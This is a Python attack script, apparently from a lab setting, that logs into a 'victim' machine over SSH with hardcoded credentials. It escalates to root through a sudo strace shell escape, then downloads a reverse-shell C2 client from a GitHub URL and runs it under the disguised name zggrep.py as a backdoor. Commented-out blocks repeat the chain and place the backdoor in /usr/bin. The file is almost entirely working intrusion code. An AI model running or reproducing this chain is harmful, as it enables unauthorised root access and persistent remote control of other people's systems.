# start_script.py
import subprocess, paramiko, config, time

hostname = config.VICTIM_IP
port = 22
username = "user"
password = "hill"
backdoor_path = config.BACKDOOR_PATH
listener_path = config.LISTENER_PATH

def run_command(cmd, timeout=30):
    """Run a command and return (success, output)."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=True,
            timeout=timeout,
        )
        return True, result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return False, e.stderr.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        return False, str(e)
    
# # download listener
# ok, output = run_command(["curl", "-o", "listener.py", f"{listener_path}"])
# print(f"listener downloaded on attacker machine" if ok else "Failed", "->", output)

# # start listener
# ok, output = run_command(["python3", "listener.py"])
# print(f"listener run on attacker host" if ok else "Failed", "->", output)


# Initialize the SSH client
client = paramiko.SSHClient()

# Automatically add the server's host key (useful for automation, though less strict)
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

try:
    # Connect to the server
    client.connect(hostname, port=port, username=username, password=password)
    
    shell = client.invoke_shell()
    
    time.sleep(1)
    if shell.recv_ready():
        shell.recv(65535)
    
    # test 
    shell.send(b"whoami\n")
    
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")
    print(output)
        
    # perform root escalation
    shell.send(b"sudo /bin/strace -o /dev/null /bin/bash -p\n")
        
    time.sleep(3)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")
    print(output)
            
    # test escalation
    shell.send(b"whoami\n")
    
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
    
    
    shell.send(b"mkdir zggrep\n")
            
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
    
    
    shell.send(b"cd zggrep\n")
            
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
               
    # get backdoor
    shell.send(b"curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py\n")
        
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
    
    # get config
    shell.send(b"curl -O https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/config.py\n")
        
    time.sleep(1)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
    
    
    shell.send(b"python zggrep.py\n")
        
    print("you have 90 seconds")
    time.sleep(85)
    output = ""
    while shell.recv_ready():
        output += shell.recv(4096).decode("utf-8")     
    print(output)
    
    print("shutting down in 5...")
    time.sleep(1)
    print("4...")
    time.sleep(1)
    print("3...")
    time.sleep(1)
    print("2...")
    time.sleep(1)
    print("1...")
    time.sleep(1)

    
    
    # commands = ["sudo /bin/strace -o /dev/null /bin/bash -p", "cd ../../usr/bin",
    #             "curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py", 
    #             "python3 zggrep.py"]
    # full_command = " && ".join(commands)
    
    # stdin, stdout, stderr = client.exec_command(full_command)
    # print(stdout.read().decode())
    # print(stderr.read().decode())

    
    # # Execute root escalation
    # stdin, stdout, stderr = client.exec_command("sudo /bin/strace -o /dev/null /bin/bash -p")
    # # Read and print the output
    # print("Output of root escalation:")
    # print(stdout.read().decode())
    
    # errors = stderr.read().decode()
    # if errors:
    #     print("Errors:")
    #     print(errors)

        
    
    # # move to directory where we will install backdoor
    # stdin, stdout, stderr = client.exec_command("cd ../../usr/bin")
    # # Read and print the output
    # print("Output dir change to /usr/bin:")
    # print(stdout.read().decode())
    
    # errors = stderr.read().decode()
    # if errors:
    #     print("Errors:")
    #     print(errors)
        
        
    # # download backdoor onto host
    # stdin, stdout, stderr = client.exec_command("curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py")
    # # Read and print the output
    # print("Output, downloading backdoor onto host:")
    # print(stdout.read().decode())
    
    # errors = stderr.read().decode()
    # if errors:
    #     print("Errors:")
    #     print(errors)
        
        
    # # execute payload
    # stdin, stdout, stderr = client.exec_command("python3 zggrep.py")
    # # Read and print the output
    # print("Output, executing payload onto host:")
    # print(stdout.read().decode())
    
    # errors = stderr.read().decode()
    # if errors:
    #     print("Errors:")
    #     print(errors)
    
finally:
    # close the connection
    shell.close()
    client.close()
    

